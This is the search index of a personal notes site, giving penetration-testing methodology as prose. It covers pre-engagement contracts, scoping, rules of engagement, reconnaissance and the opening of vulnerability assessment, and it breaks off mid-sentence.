{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Home","text":"You have reached the landing page for notes.arenwald.com \ud83d\udc4b"},{"location":"Pentesting/Useful%20Links/","title":"Useful Links","text":"<p>Internet All The Things: https://swisskyrepo.github.io/InternalAllTheThings/ PayloadAllTheThings: https://swisskyrepo.github.io/PayloadsAllTheThings/ HackTricks: https://book.hacktricks.xyz/ 0xdf hacks stuff: https://0xdf.gitlab.io/ OverTheWire Wargames: https://overthewire.org/wargames/ UnderTheWire Wargames: https://underthewire.tech/wargames  </p>"},{"location":"Pentesting/Useful%20Links/#enumeration-scripts","title":"Enumeration Scripts","text":"<p>PEASS-ng: https://github.com/peass-ng/PEASS-ng</p>"},{"location":"Pentesting/Useful%20Links/#linux","title":"Linux","text":"<p>LinEnum: https://github.com/rebootuser/LinEnum linuxprevchecker: https://github.com/sleventyeleven/linuxprivchecker</p>"},{"location":"Pentesting/Useful%20Links/#windows","title":"Windows","text":"<p>Seatbelt: https://github.com/GhostPack/Seatbelt JAWS: https://github.com/411Hall/JAWS</p>"},{"location":"Pentesting/Useful%20Links/#privesc","title":"PrivEsc","text":"<p>GTFOBins: https://gtfobins.github.io/ LOLBAS: https://lolbas-project.github.io/#</p>"},{"location":"Pentesting/Useful%20Links/#re","title":"Re","text":"<p>https://x86re.com/</p>"},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/0.%20Pre-Engagement/","title":"0. Pre Engagement","text":"<p>Pre-engagement is the stage of preparation for the actual penetration test. During this stage, many questions are asked, and some contractual agreements are made. The client informs us about what they want to be tested, and we explain in detail how to make the test as efficient as possible.</p> <p></p> <p>The entire pre-engagement process consists of three essential components:</p> <ol> <li> <p>Scoping questionnaire</p> </li> <li> <p>Pre-engagement meeting</p> </li> <li> <p>Kick-off meeting</p> </li> </ol> <p>Before any of these can be discussed in detail, a\u00a0<code>Non-Disclosure Agreement</code>\u00a0(<code>NDA</code>) must be signed by all parties. There are several types of NDAs:</p> Type Description <code>Unilateral NDA</code> This type of NDA obligates only one party to maintain confidentiality and allows the other party to share the information received with third parties. <code>Bilateral NDA</code> In this type, both parties are obligated to keep the resulting and acquired information confidential. This is the most common type of NDA that protects the work of penetration testers. <code>Multilateral NDA</code> Multilateral NDA is a commitment to confidentiality by more than two parties. If we conduct a penetration test for a cooperative network, all parties responsible and involved must sign this document. <p>Exceptions can also be made in urgent cases, where we jump into the kick-off meeting, which can also occur via an online conference. It is essential to know\u00a0<code>who in the company is permitted</code>\u00a0to contract us for a penetration test. Because we cannot accept such an order from everyone. Imagine, for example, that a company employee hires us with the pretext of checking the corporate network's security. However, after we finished the assessment, it turned out that this employee wanted to harm their own company and had no authorization to have the company tested. This would put us in a critical situation from a legal point of view.</p> <p>Below is a sample (not exhaustive) list of company members who may be authorized to hire us for penetration testing. This can vary from company to company, with larger organizations not involving the C-level staff directly and the responsibility falling on IT, Audit, or IT Security senior management or the like.</p> Chief Executive Officer (CEO) Chief Technical Officer (CTO) Chief Information Security Officer (CISO) Chief Security Officer (CSO) Chief Risk Officer (CRO) Chief Information Officer (CIO) VP of Internal Audit Audit Manager VP or Director of IT/Information Security <p>It is vital to determine early on in the process who has signatory authority for the contract, Rules of Engagement documents, and who will be the primary and secondary points of contact, technical support, and contact for escalating any issues.</p> <p>This stage also requires the preparation of several documents before a penetration test can be conducted that must be signed by our client and us so that the declaration of consent can also be presented in written form if required. Otherwise the penetration test could breach the\u00a0Computer Misuse Act. These documents include, but are not limited to:</p> Document Timing for Creation <code>1. Non-Disclosure Agreement</code>\u00a0(<code>NDA</code>) <code>After</code>\u00a0Initial Contact <code>2. Scoping Questionnaire</code> <code>Before</code>\u00a0the Pre-Engagement Meeting <code>3. Scoping Document</code> <code>During</code>\u00a0the Pre-Engagement Meeting <code>4. Penetration Testing Proposal</code>\u00a0(<code>Contract/Scope of Work</code>\u00a0(<code>SoW</code>)) <code>During</code>\u00a0the Pre-engagement Meeting <code>5. Rules of Engagement</code>\u00a0(<code>RoE</code>) <code>Before</code>\u00a0the Kick-Off Meeting <code>6. Contractors Agreement</code>\u00a0(Physical Assessments) <code>Before</code>\u00a0the Kick-Off Meeting <code>7. Reports</code> <code>During</code>\u00a0and\u00a0<code>after</code>\u00a0the conducted Penetration Test <p>Note: Our client may provide a separate scoping document listing in-scope IP addresses/ranges/URLs and any necessary credentials but this information should also be documented as an appendix in the RoE document.</p> <p>Important Note:</p> <p>These documents should be reviewed and adapted by a lawyer after they have been prepared.</p>","tags":["Pentesting","Process","Pre-Engagement"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/0.%20Pre-Engagement/#scoping-questionnaire","title":"Scoping Questionnaire","text":"<p>After initial contact is made with the client, we typically send them a\u00a0<code>Scoping Questionnaire</code>\u00a0to better understand the services they are seeking. This scoping questionnaire should clearly explain our services and may typically ask them to choose one or more from the following list:</p> \u2610 Internal Vulnerability Assessment \u2610 External Vulnerability Assessment \u2610 Internal Penetration Test \u2610 External Penetration Test \u2610 Wireless Security Assessment \u2610 Application Security Assessment \u2610 Physical Security Assessment \u2610 Social Engineering Assessment \u2610 Red Team Assessment \u2610 Web Application Security Assessment <p>Under each of these, the questionnaire should allow the client to be more specific about the required assessment. Do they need a web application or mobile application assessment? Secure code review? Should the Internal Penetration Test be black box and semi-evasive? Do they want just a phishing assessment as part of the Social Engineering Assessment or also vishing calls? This is our chance to explain the depth and breadth of our services, ensure that we understand our client's needs and expectations, and ensure that we can adequately deliver the assessment they require.</p> <p>Aside from the assessment type, client name, address, and key personnel contact information, some other critical pieces of information include:</p> How many expected live hosts? How many IPs/CIDR ranges in scope? How many Domains/Subdomains are in scope? How many wireless SSIDs in scope? How many web/mobile applications? If testing is authenticated, how many roles (standard user, admin, etc.)? For a phishing assessment, how many users will be targeted? Will the client provide a list, or we will be required to gather this list via OSINT? If the client is requesting a Physical Assessment, how many locations? If multiple sites are in-scope, are they geographically dispersed? What is the objective of the Red Team Assessment? Are any activities (such as phishing or physical security attacks) out of scope? Is a separate Active Directory Security Assessment desired? Will network testing be conducted from an anonymous user on the network or a standard domain user? Do we need to bypass Network Access Control (NAC)? <p>Finally, we will want to ask about information disclosure and evasiveness (if applicable to the assessment type):</p> <ul> <li> <p>Is the Penetration Test black box (no information provided), grey box (only IP address/CIDR ranges/URLs provided), white box (detailed information provided)</p> </li> <li> <p>Would they like us to test from a non-evasive, hybrid-evasive (start quiet and gradually become \"louder\" to assess at what level the client's security personnel detect our activities), or fully evasive.</p> </li> </ul> <p>This information will help us ensure we assign the right resources and deliver the engagement based on the client's expectations. This information is also necessary for providing an accurate proposal with a project timeline (for example, a Vulnerability Assessment will take considerably less time than a Red Team Assessment) and cost (an External Penetration Test against 10 IPs will cost significantly less than an Internal Penetration Test with 30 /24 networks in-scope).</p> <p>Based on the information we received from the scoping questionnaire, we create an overview and summarize all information in the\u00a0<code>Scoping Document</code>.</p>","tags":["Pentesting","Process","Pre-Engagement"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/0.%20Pre-Engagement/#pre-engagement-meeting","title":"Pre-Engagement Meeting","text":"<p>Once we have an initial idea of the client's project requirements, we can move on to the\u00a0<code>pre-engagement meeting</code>. This meeting discusses all relevant and essential components with the customer before the penetration test, explaining them to our customer. The information we gather during this phase, along with the data collected from the scoping questionnaire, will serve as inputs to the\u00a0<code>Penetration Testing Proposal</code>, also known as the\u00a0<code>Contract</code>\u00a0or\u00a0<code>Scope of Work</code>\u00a0(<code>SoW</code>). We can think of the whole process as a visit to the doctor to inform ourselves regarding the planned examinations. This phase typically occurs via e-mail and during an online conference call or in-person meeting.</p> <p>Note: We may encounter clients during our career that are undergoing their first ever penetration test, or the direct client PoC is not familiar with the process. It is not uncommon to use part of the pre-engagement meeting to review the scoping questionnaire either in part or step-by-step.</p>","tags":["Pentesting","Process","Pre-Engagement"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/0.%20Pre-Engagement/#contract-checklist","title":"Contract - Checklist","text":"Checkpoint Description <code>\u2610 NDA</code> Non-Disclosure Agreement (NDA) refers to a secrecy contract between the client and the contractor regarding all written or verbal information concerning an order/project. The contractor agrees to treat all confidential information brought to its attention as strictly confidential, even after the order/project is completed. Furthermore, any exceptions to confidentiality, the transferability of rights and obligations, and contractual penalties shall be stipulated in the agreement. The NDA should be signed before the kick-off meeting or at the latest during the meeting before any information is discussed in detail. <code>\u2610 Goals</code> Goals are milestones that must be achieved during the order/project. In this process, goal setting is started with the significant goals and continued with fine-grained and small ones. <code>\u2610 Scope</code> The individual components to be tested are discussed and defined. These may include domains, IP ranges, individual hosts, specific accounts, security systems, etc. Our customers may expect us to find out one or the other point by ourselves. However, the legal basis for testing the individual components has the highest priority here. <code>\u2610 Penetration Testing Type</code> When choosing the type of penetration test, we present the individual options and explain the advantages and disadvantages. Since we already know the goals and scope of our customers, we can and should also make a recommendation on what we advise and justify our recommendation accordingly. Which type is used in the end is the client's decision. <code>\u2610 Methodologies</code> Examples: OSSTMM, OWASP, automated and manual unauthenticated analysis of the internal and external network components, vulnerability assessments of network components and web applications, vulnerability threat vectorization, verification and exploitation, and exploit development to facilitate evasion techniques. <code>\u2610 Penetration Testing Locations</code> External: Remote (via secure VPN) and/or Internal: Internal or Remote (via secure VPN) <code>\u2610 Time Estimation</code> For the time estimation, we need the start and the end date for the penetration test. This gives us a precise time window to perform the test and helps us plan our procedure. It is also vital to explicitly ask how time windows the individual attacks (Exploitation / Post-Exploitation / Lateral Movement) are to be carried out. These can be carried out during or outside regular working hours. When testing outside regular working hours, the focus is more on the security solutions and systems that should withstand our attacks. <code>\u2610 Third Parties</code> For the third parties, it must be determined via which third-party providers our customer obtains services. These can be cloud providers, ISPs, and other hosting providers. Our client must obtain written consent from these providers describing that they agree and are aware that certain parts of their service will be subject to a simulated hacking attack. It is also highly advisable to require the contractor to forward the third-party permission sent to us so that we have actual confirmation that this permission has indeed been obtained. <code>\u2610 Evasive Testing</code> Evasive testing is the test of evading and passing security traffic and security systems in the customer's infrastructure. We look for techniques that allow us to find out information about the internal components and attack them. It depends on whether our contractor wants us to use such techniques or not. <code>\u2610 Risks</code> We must also inform our client about the risks involved in the tests and the possible consequences. Based on the risks and their potential severity, we can then set the limitations together and take certain precautions. <code>\u2610 Scope Limitations &amp; Restrictions</code> It is also essential to determine which servers, workstations, or other network components are essential for the client's proper functioning and its customers. We will have to avoid these and must not influence them any further, as this could lead to critical technical errors that could also affect our client's customers in production. <code>\u2610 Information Handling</code> HIPAA, PCI, HITRUST, FISMA/NIST, etc. <code>\u2610 Contact Information</code> For the contact information, we need to create a list of each person's name, title, job title, e-mail address, phone number, office phone number, and an escalation priority order. <code>\u2610 Lines of Communication</code> It should also be documented which communication channels are used to exchange information between the customer and us. This may involve e-mail correspondence, telephone calls, or personal meetings. <code>\u2610 Reporting</code> Apart from the report's structure, any customer-specific requirements the report should contain are also discussed. In addition, we clarify how the reporting is to take place and whether a presentation of the results is desired. <code>\u2610 Payment Terms</code> Finally, prices and the terms of payment are explained. <p>The most crucial element of this meeting is the detailed presentation of the penetration test to our client and its focus. As we already know, each piece of infrastructure is unique for the most part, and each client has particular preferences on which they place the most importance. Finding out these priorities is an essential part of this meeting.</p> <p>We can think of it as ordering in a restaurant. If we want a medium-rare steak and the chef gives us a well-done steak because he believes it is better, it will not be what we were hoping for. Therefore, we should prioritize our client's wishes and serve the steak as they ordered.</p> <p>Based on the\u00a0<code>Contract Checklist</code>\u00a0and the input information shared in scoping, the\u00a0<code>Penetration Testing Proposal</code>\u00a0(<code>Contract</code>) and the associated\u00a0<code>Rules of Engagement</code>\u00a0(<code>RoE</code>) are created.</p>","tags":["Pentesting","Process","Pre-Engagement"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/0.%20Pre-Engagement/#rules-of-engagement-checklist","title":"Rules of Engagement - Checklist","text":"Checkpoint Contents <code>\u2610 Introduction</code> Description of this document. <code>\u2610 Contractor</code> Company name, contractor full name, job title. <code>\u2610 Penetration Testers</code> Company name, pentesters full name. <code>\u2610 Contact Information</code> Mailing addresses, e-mail addresses, and phone numbers of all client parties and penetration testers. <code>\u2610 Purpose</code> Description of the purpose for the conducted penetration test. <code>\u2610 Goals</code> Description of the goals that should be achieved with the penetration test. <code>\u2610 Scope</code> All IPs, domain names, URLs, or CIDR ranges. <code>\u2610 Lines of Communication</code> Online conferences or phone calls or face-to-face meetings, or via e-mail. <code>\u2610 Time Estimation</code> Start and end dates. <code>\u2610 Time of the Day to Test</code> Times of the day to test. <code>\u2610 Penetration Testing Type</code> External/Internal Penetration Test/Vulnerability Assessments/Social Engineering. <code>\u2610 Penetration Testing Locations</code> Description of how the connection to the client network is established. <code>\u2610 Methodologies</code> OSSTMM, PTES, OWASP, and others. <code>\u2610 Objectives / Flags</code> Users, specific files, specific information, and others. <code>\u2610 Evidence Handling</code> Encryption, secure protocols <code>\u2610 System Backups</code> Configuration files, databases, and others. <code>\u2610 Information Handling</code> Strong data encryption <code>\u2610 Incident Handling and Reporting</code> Cases for contact, pentest interruptions, type of reports <code>\u2610 Status Meetings</code> Frequency of meetings, dates, times, included parties <code>\u2610 Reporting</code> Type, target readers, focus <code>\u2610 Retesting</code> Start and end dates <code>\u2610 Disclaimers and Limitation of Liability</code> System damage, data loss <code>\u2610 Permission to Test</code> Signed contract, contractors agreement","tags":["Pentesting","Process","Pre-Engagement"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/0.%20Pre-Engagement/#kick-off-meeting","title":"Kick-Off Meeting","text":"<p>The\u00a0<code>kick-off meeting</code>\u00a0usually occurs at a scheduled time and in-person after signing all contractual documents. This meeting usually includes client POC(s) (from Internal Audit, Information Security, IT, Governance &amp; Risk, etc., depending on the client), client technical support staff (developers, sysadmins, network engineers, etc.), and the penetration testing team (someone in a management role (such as the Practice Lead), the actual penetration tester(s), and sometimes a Project Manager or even the Sales Account Executive or similar). We will go over the nature of the penetration test and how it will take place. Usually, there is no Denial of Service (DoS) testing. We also explain that if a critical vulnerability is identified, penetration testing activities will be paused, a vulnerability notification report will be generated, and the emergency contacts will be contacted. Typically these are only generated during External Penetration Tests for critical flaws such as unauthenticated remote code execution (RCE), SQL injection, or another flaw that leads to sensitive data disclosure. The purpose of this notification is to allow the client to assess the risk internally and determine if the issue warrants an emergency fix. We would typically only stop an Internal Penetration Test and alert the client if a system becomes unresponsive, we find evidence of illegal activity (such as illegal content on a file share) or the presence of an external threat actor in the network or a prior breach.</p> <p>We must also inform our customers about potential risks during a penetration test. For example, we should mention that a penetration test can leave many\u00a0<code>log entries and alarms</code>\u00a0in their security applications. In addition, if brute forcing or any similar attack is used, it is also worth mentioning that we may accidentally\u00a0<code>lock some users</code>\u00a0found during the penetration test. We also must inform our customers that they must contact us immediately if the penetration test performed\u00a0<code>negatively impacts their network</code>.</p> <p>Explaining the penetration testing process gives everyone involved a clear idea of our entire process. This demonstrates our professional approach and convinces our questioners that we know what we are doing. Because apart from the technical staff, CTO, and CISO, it will sound like a certain kind of magic that is very difficult for non-technical professionals to understand. So we must be mindful of our audience and target the most technically inexperienced questioner so our approach can be followed by everyone we talk to.</p> <p>All points related to testing need to be discussed and clarified. It is crucial to respond precisely to the wishes and expectations of the customer/client. Every company structure and network is different and requires an adapted approach. Each client has different goals, and we should adjust our testing to their wishes. We can typically see how experienced our clients are in undergoing penetration tests early in the call, so we may have to shift our focus to explain things in more detail and be prepared to field more questions, or the kickoff call may be very quick and straightforward.</p>","tags":["Pentesting","Process","Pre-Engagement"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/0.%20Pre-Engagement/#contractors-agreement","title":"Contractors Agreement","text":"<p>If the penetration test also includes physical testing, then an additional contractor's agreement is required. Since it is not only a virtual environment but also a physical intrusion, completely different laws apply here. It is also possible that many of the employees have not been informed about the test. Suppose we encounter employees with a very high-security awareness during the physical attack and social engineering attempts, and we get caught. In that case, the employees will, in most cases, contact the police. This additional\u00a0<code>contractor's agreement</code>\u00a0is our \"<code>get out of jail free card</code>\" in this case.</p>","tags":["Pentesting","Process","Pre-Engagement"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/0.%20Pre-Engagement/#contractors-agreement-checklist-for-physical-assessments","title":"Contractors Agreement - Checklist for Physical Assessments","text":"Checkpoint <code>\u2610 Introduction</code> <code>\u2610 Contractor</code> <code>\u2610 Purpose</code> <code>\u2610 Goal</code> <code>\u2610 Penetration Testers</code> <code>\u2610 Contact Information</code> <code>\u2610 Physical Addresses</code> <code>\u2610 Building Name</code> <code>\u2610 Floors</code> <code>\u2610 Physical Room Identifications</code> <code>\u2610 Physical Components</code> <code>\u2610 Timeline</code> <code>\u2610 Notarization</code> <code>\u2610 Permission to Test</code>","tags":["Pentesting","Process","Pre-Engagement"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/1.%20Information%20Gathering/","title":"1. Information Gathering","text":"<p>Once the pre-engagement phase has been completed, and all parties have signed all contractual terms and conditions, the\u00a0<code>information gathering</code>\u00a0phase begins. Information gathering is an essential part of any security assessment. This is the phase in which we gather all available information about the company, its employees and infrastructure, and how they are organized. Information gathering is the most frequent and vital phase throughout the penetration testing process, to which we will return again and again.</p> <p></p> <p>All the steps we take to exploit the vulnerabilities are based on the information we enumerate about our targets. This phase can be considered the cornerstone of any penetration test. We can obtain the necessary information relevant to us in many different ways. However, we can divide them into the following categories:</p> <ul> <li>Open-Source Intelligence</li> <li>Infrastructure Enumeration</li> <li>Service Enumeration</li> <li>Host Enumeration</li> </ul> <p>All four categories should and must be performed by us for each penetration test. This is because the\u00a0<code>information</code>\u00a0is the main component that leads us to successful penetration testing and identifying security vulnerabilities. We can get this information anywhere, whether on social media, job postings, individual hosts and servers, or even the employees. Information is continually being spread and shared everywhere.</p> <p>After all, we humans communicate by exchanging information, but network components and services communicate similarly. Any exchange of information always has a specific purpose. For computer networks, the aim is always to trigger a particular process. Be it storing data in a database, registering, generating specific values, or forwarding the information.</p>","tags":["Pentesting","Process","Information_Gathering"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/1.%20Information%20Gathering/#open-source-intelligence","title":"Open-Source Intelligence","text":"<p>Let's assume that our client wants us to see what information we can find about his company on the internet. For this purpose, we use what is known as\u00a0<code>Open Source Intelligence</code>\u00a0(<code>OSINT</code>). OSINT is a process for finding publicly available information on a target company or individuals that allows the identification of events (i.e., public and private meetings), external and internal dependencies, and connections. OSINT uses public (Open-Source) information from freely available sources to obtain the desired results. We can often find security-relevant and sensitive information from companies and their employees. Usually, the people who share such information are unaware that they are not the only ones who can access it.</p> <p>It is possible to find highly sensitive information such as passwords, hashes, keys, tokens, and much more that can give us access to the network within just a few minutes. Repositories on sites like\u00a0Github\u00a0or other development platforms are often not set up correctly, and external viewers can see this information. If this type of sensitive information is found at the onset of testing, the Incident Handling and Report section of the RoE should describe the procedure for reporting these types of critical security vulnerabilities. Publicly published passwords or SSH keys represent a critical security gap if they have not already been removed or changed. Therefore, our client's administrator must review this information before we proceed.</p>","tags":["Pentesting","Process","Information_Gathering"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/1.%20Information%20Gathering/#private-and-public-ssh-keys","title":"Private and Public SSH Keys","text":"<p>Developers often share whole sections of code on\u00a0StackOverflow\u00a0to show other developers a better overview of how their code works to help them solve their problems. This type of information can also be found very quickly and used against the company. Our task is to find such security holes and have them closed. We can learn much more from the\u00a0OSINT: Corporate Recon\u00a0module. It shows many different techniques for how we can find such information.</p>","tags":["Pentesting","Process","Information_Gathering"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/1.%20Information%20Gathering/#infrastructure-enumeration","title":"Infrastructure Enumeration","text":"<p>During the infrastructure enumeration, we try to overview the company's position on the internet and intranet. For this, we use OSINT and the first active scans. We use services such as DNS to create a map of the client's servers and hosts and develop an understanding of how their\u00a0<code>infrastructure</code>\u00a0is structured. This includes name servers, mail servers, web servers, cloud instances, and more. We make an accurate list of hosts and their IP addresses and compare them to our scope to see if they are included and listed.</p> <p>In this phase, we also try to determine the company's security measures. The more precise this information is, the easier it will be to disguise our attacks (<code>Evasive Testing</code>). But identifying firewalls, such as web application firewalls, also gives us an excellent understanding of what techniques could trigger an alarm for our customer and what methods can be used to avoid that alarm.</p> <p>Here, it also does not matter \"where\" we are positioned, whether we are trying to gain an overview of the infrastructure from the outside (<code>external</code>) or examining the infrastructure from the inside (<code>internal</code>) of the network. Enumeration from inside the network gives us a good overview of the hosts and servers that we can use as targets for a\u00a0<code>Password Spraying</code>\u00a0attack, in which we use one password to attempt to authenticate with as many different user names as possible, hoping for one successful authentication attempt to grant us a foothold in the network. All these methods and techniques used for this purpose will be looked at in more detail in the individual modules.</p>","tags":["Pentesting","Process","Information_Gathering"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/1.%20Information%20Gathering/#service-enumeration","title":"Service Enumeration","text":"<p>In service enumeration, we identify services that allow us to interact with the host or server over the network (or locally, from an internal perspective). Therefore, it is crucial to find out about the service, what\u00a0<code>version</code>\u00a0it is, what\u00a0<code>information</code>\u00a0it provides us, and the\u00a0<code>reason</code>\u00a0it can be used. Once we understand the background of what this service has been provisioned for, some logical conclusions can be drawn to provide us with several options.</p> <p>Many services have a version history that allows us to identify whether the installed version on the host or server is actually up to date or not. This will also help us find security vulnerabilities that remain with older versions in most cases. Many administrators are afraid to change applications that work, as it could harm the entire infrastructure. Therefore, administrators often prefer to accept the risk of leaving one or more vulnerabilities open and maintaining the functionality instead of closing the security gaps.</p>","tags":["Pentesting","Process","Information_Gathering"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/1.%20Information%20Gathering/#host-enumeration","title":"Host Enumeration","text":"<p>Once we have a detailed list of the customer's infrastructure, we examine every single host listed in the scoping document. We try to identify which\u00a0<code>operating system</code>\u00a0is running on the host or server, which\u00a0<code>services</code>\u00a0it uses, which\u00a0<code>versions</code>\u00a0of the services, and much more. Again, apart from the active scans, we can also use various OSINT methods to tell us how this host or server may be configured.</p> <p>We can find many different services, such as an FTP server that the company uses to exchange data between employees and even allows anonymous access. Even today, there are many hosts and servers that the manufacturers no longer support. However, vulnerabilities are still found for these older versions of operating systems and services, which then remain and endanger our client's entire infrastructure.</p> <p>It does not matter here whether we examine each host or server externally or internally. However, from the internal perspective, we will find services that are often not accessible from the outside. Therefore, many administrators become careless and often consider these services \"secure\" because they are not directly accessible from the internet. Thus, many misconfigurations are often discovered here due to these assumptions or lax practices. During host enumeration, we try to determine what role this host or server plays and what network components it communicates with. In addition, we must also identify which\u00a0<code>services</code>\u00a0it uses for this purpose and on which\u00a0<code>ports</code>\u00a0they are located.</p> <p>During internal host enumeration, which in most cases comes after the successful\u00a0<code>Exploitation</code>\u00a0of one or more vulnerabilities, we also examine the host or server from the inside. This means we look for sensitive\u00a0<code>files</code>, local\u00a0<code>services</code>,\u00a0<code>scripts</code>,\u00a0<code>applications</code>,\u00a0<code>information</code>, and other things that could be stored on the host. This is also an essential part of the\u00a0<code>Post-Exploitation</code>\u00a0phase, where we try to exploit and elevate privileges.</p>","tags":["Pentesting","Process","Information_Gathering"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/1.%20Information%20Gathering/#pillaging","title":"Pillaging","text":"<p>Another essential step is\u00a0<code>Pillaging</code>. After hitting the\u00a0<code>Post-Exploitation</code>\u00a0stage, pillaging is performed to collect sensitive information locally on the already exploited host, such as employee names, customer data, and much more. However, this information gathering only occurs after exploiting the target host and gaining access to it.</p> <p>The information we can obtain on the exploited hosts can be divided into many different categories and varies greatly. This depends on the purpose of the host and its positioning in the corporate network. The administrators taking the security measures for these hosts also play a significant role. Nevertheless, such information can show the\u00a0<code>impact</code>\u00a0of a potential attack on our client and be used for further steps to\u00a0<code>escalate our privileges</code>\u00a0or\u00a0<code>move laterally</code>\u00a0further in the network.</p> <ul> <li>Note that\u00a0<code>HTB Academy</code>\u00a0does not have a module explicitly focused on pillaging.</li> </ul> <p>This is intentional for reasons we will clarify here. Pillaging alone is not a stage or a subcategory as many often describe but an integral part of the information gathering and privilege escalation stages that is inevitably performed locally on target systems.</p> <ul> <li><code>Pillaging is explained in other modules separately, where we consider the corresponding steps valuable and necessary.</code></li> </ul> <p>Here is a small list of modules where\u00a0<code>Pillaging</code>\u00a0is covered, but this topic will be covered in many other modules as well:</p> <code>Network Enumeration with Nmap</code> <code>Getting Started</code> <code>Password Attacks</code> <code>Active Directory Enumeration &amp; Attacks</code> <code>Linux Privilege Escalation</code> <code>Windows Privilege Escalation</code> <code>Attacking Common Services</code> <code>Attacking Common Applications</code> <code>Attacking Enterprise Networks</code> <p>We will interact with more than\u00a0<code>150 targets</code>\u00a0during the Penetration Tester Job Role Path and perform nine simulated mini penetration tests, giving us plenty of opportunities to work on and practice this topic. Furthermore, operating system-specific modules should be considered from the pillaging point of view because much of what is shown in those modules can be used for information retrieval or privilege escalation on the target systems.</p>","tags":["Pentesting","Process","Information_Gathering"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/2.%20Vulnerability%20Assessment/","title":"2. Vulnerability Assessment","text":"<p>During the\u00a0<code>vulnerability assessment</code>\u00a0phase, we examine and analyze the information gathered during the information gathering phase. The vulnerability assessment phase is an analytical process based on the findings.</p> <p></p> <p><code>An analysis is a detailed examination of an event or process, describing its origin and impact, that with the help of certain precautions and actions, can be triggered to support or prevent future occurrences.</code></p> <p>Any analysis can be very complicated, as many different factors and their interdependencies play a significant role. Apart from the fact that we work with the three different times (past, present, and future) during each analysis, the origin and destination play a significant role. There are four different types of analysis:</p> Analysis Type Description <code>Descriptive</code> Descriptive analysis is essential in any data analysis. On the one hand, it describes a data set based on individual characteristics. It helps to detect possible errors in data collection or outliers in the data set. <code>Diagnostic</code> Diagnostic analysis clarifies conditions' causes, effects, and interactions. Doing so provides insights that are obtained through correlations and interpretation. We must take a backward-looking view, similar to descriptive analysis, with the subtle difference that we try to find reasons for events and developments. <code>Predictive</code> By evaluating historical and current data, predictive analysis creates a predictive model for future probabilities. Based on the results of descriptive and diagnostic analyses, this method of data analysis makes it possible to identify trends, detect deviations from expected values at an early stage, and predict future occurrences as accurately as possible. <code>Prescriptive</code> Prescriptive analytics aims to narrow down what actions to take to eliminate or prevent a future problem or trigger a specific activity or process. <p>We use our results and information obtained so far and analyze them to make conclusions. The formation of conclusions can be extended very far, but we must then confirm or disprove them. Suppose we found an open TCP port 2121 on a host during the information-gathering phase.</p> <p>Other than the fact that this port is open, Nmap did not show us anything else. We must now ask ourselves what conclusions can be drawn from this result. Therefore, it does not matter which question we start with to make our conclusions. However, it is essential to ask\u00a0<code>precise questions</code>\u00a0and remember what we\u00a0<code>know</code>\u00a0and\u00a0<code>do not know</code>. At this point, we must first ask ourselves what we\u00a0<code>see</code>\u00a0and what we actually\u00a0<code>have</code>, because what we see is not the same as what we have:</p> <ul> <li> <p>a\u00a0<code>TCP</code>\u00a0port\u00a0<code>2121</code>. -\u00a0<code>TCP</code>\u00a0already means that this service is\u00a0<code>connection-oriented</code>.</p> </li> <li> <p>Is this a\u00a0<code>standard</code>\u00a0port? -\u00a0<code>No</code>, because these are between\u00a0<code>0-1023</code>, aka well-known or\u00a0system ports</p> </li> <li> <p>Are there any numbers in this\u00a0<code>port number</code>\u00a0that look\u00a0<code>familiar</code>? -\u00a0<code>Yes</code>,\u00a0<code>TCP</code>\u00a0port\u00a0<code>21</code>\u00a0(<code>FTP</code>). From our experience, we will get to know many standard ports and their services, which administrators often try to disguise, but often use \"easy to remember\" alternatives.</p> </li> </ul> <p>Based on our guess, we can try to connect to the service using\u00a0<code>Netcat</code>\u00a0or an\u00a0<code>FTP</code>\u00a0client and try to establish a connection to confirm or disprove our guess.</p> <p>While connecting to the service, we noticed that the connection took longer than usual (about 15 seconds). There are some services whose connection speed, or response time, can be configured. Now that we know that an FTP server is running on this port, we can deduce the origin of our \"failed\" scan. We could confirm this again by specifying the minimum\u00a0<code>probe round trip time</code>\u00a0(<code>--min-rtt-timeout</code>) in Nmap to 15 or 20 seconds and rerunning the scan.</p>","tags":["Pentesting","Process","Vulnerability_Assessment","Pre-Exploitation"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/2.%20Vulnerability%20Assessment/#vulnerability-research-and-analysis","title":"Vulnerability Research and Analysis","text":"<p><code>Information Gathering</code>\u00a0and\u00a0<code>Vulnerability Research</code>\u00a0can be considered a part of descriptive analysis. This is where we identify the individual network or system components we are investigating. In\u00a0<code>Vulnerability Research</code>, we look for known vulnerabilities, exploits, and security holes that have already been discovered and reported. Therefore, if we have identified a version of a service or application through information gathering and found a\u00a0Common Vulnerabilities and Exposures (CVE), it is very likely that this vulnerability is still present.</p> <p>We can find vulnerability disclosures for each component using many different sources. These include, but are not limited to:</p> CVEdetails Exploit DB Vulners Packet Storm Security NIST <p>This is where\u00a0<code>Diagnostic Analysis</code>\u00a0and\u00a0<code>Predictive Analysis</code>\u00a0is used. Once we have found a published vulnerability like this, we can diagnose it to determine what is causing or has caused the vulnerability. Here, we must understand the functionality of the\u00a0<code>Proof-Of-Concept</code>\u00a0(<code>POC</code>) code or the application or service itself as best as possible, as many manual configurations by administrators will require some customization for the POC. Each POC is tailored to a specific case that we will also need to adapt 